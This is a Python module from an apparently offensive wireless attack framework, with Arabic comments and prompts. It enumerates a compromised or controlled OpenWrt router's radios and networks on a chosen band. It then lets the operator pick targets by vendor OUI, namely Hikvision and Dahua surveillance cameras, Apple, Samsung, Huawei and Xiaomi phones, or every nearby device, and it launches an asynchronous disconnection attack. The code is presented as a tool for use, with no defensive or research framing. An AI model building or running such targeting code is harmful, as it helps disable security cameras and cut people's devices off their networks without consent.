#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ultimate C3 Framework - Hardened Unified Dynamic Band Selector Core
File: /home/kali/C3_Framework/modules/ap_selector_core.py
"""

import sys
import time

class UnifiedBandSelectorCore:
    def __init__(self, bootstrap_context):
        """
        استقبل سياق اللودر لمنع الاعتماد الدائري وتأمين انسياب المراجع
        """
        self.ctx = bootstrap_context

    def process_isolated_band_flow(self, selected_ap, frequency_target="2G"):
        """
        محرك معالجة موحد للنطاقات يحظر فخ الـ KeyError ويمرر المعطيات بالترتيب المتوافق
        """
        release_info = self.ctx.verifier.fetch_openwrt_firmware_release()
        interfaces_map = self.ctx.verifier.fetch_isolated_interfaces_map()
        
        print(f"\n\033[92m[+] تم تأكيد الاتصال الحار بنجاح صامد بقاذف الـ {frequency_target}:\033[0m")
        print(f"  -> النظام الداخلي: {release_info['dist']} (إصدار: {release_info['version']})")
        print(f"  -> كيرنل النواة البعيدة: {release_info['kernel']}")
        
        print(f"\n\033[94m[*] خارطة الكروت والترددات المفككة عتادياً لنطاق الـ {frequency_target} حصرًا:\033[0m")
        print(f"  ■ نطاق تردد وحزم الـ {frequency_target}:")
        
        target_pool = interfaces_map.get(frequency_target, [])
        if not target_pool:
            print(f"    [!] لا توجد كروت أو واجهات بث نشطة لنطاق الـ {frequency_target} حالياً.")
            time.sleep(2)
            return False

        # التحصين ضد KeyError: التحقق الصارم من سلامة القواميس الفرعية قبل القراءة
        for iface in target_pool:
            if not isinstance(iface, dict) or "radio" not in iface or "interface_name" not in iface:
                print("    \033[91m[!] رصد واجهة بث مشوهة عتادياً بالراوتر البعيد، تخطي حماية للذاكرة.\033[0m")
                continue
                
            print(f"    - كرت: {iface['radio']} | الواجهة: {iface['interface_name']} | القناة: {iface.get('channel', 0)} | الشبكة: \033[93m{iface.get('ssid', '<Hidden>')}\033[0m | الوضع: {iface.get('status', 'DOWN')}")
            
        confirm = input(f"\n[?] هل تود اعتماد هذا القاذف وبدء قفل قناة الـ {frequency_target}؟ [y/n]: ").strip().lower()
        if confirm != 'y':
            return False

        self.ctx.active_frequency = frequency_target
        print("\n[ إعدادات واجهة فلاتر البصمات وتوجيه القذائف الجراحية OUI ]")
        print(" [\033[92m1\033[0m] استهداف جراحي قاطع لكاميرات المراقبة الأمنية حصرًا (Hikvision & Dahua)")
        print(" [\033[92m2\033[0m] استهداف محطات الأجهزة الذكية والهواتف فقط (Apple/Samsung/Huawei/Xiaomi)")
        print(" [\033[92m3\033[0m] إطلاق الفصل التلقائي الشامل على كافة كيانات الأجواء عشوائياً (Wildcard)")
        oui_choice = input("[>] برجاء اختيار وضع الفلترة [1/2/3]: ").strip()
        
        # التصحيح التكتيكي الصخر: تمرير الهويات المباشرة والحركية من الـ Record لمنع الـ Parameter Mismatch
        self.ctx.pipeline.start_asynchronous_attack(frequency_target, oui_choice, selected_ap[1], selected_ap[2])
        return True
